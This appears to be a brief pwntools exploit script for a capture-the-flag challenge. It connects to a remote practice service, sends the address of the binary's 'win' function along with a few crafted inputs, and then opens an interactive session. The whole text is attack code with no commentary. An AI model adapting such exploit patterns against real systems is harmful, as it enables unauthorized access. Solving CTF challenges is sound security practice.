#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./challenge',checksec= False)
#p = process()
p = remote('svc.pwnable.xyz',30002)
input()
p.sendlineafter(b'Input: ',str(exe.sym.win))
p.sendline(b'0')
p.sendline(b'13')
p.sendline("a  a a")


p.interactive()
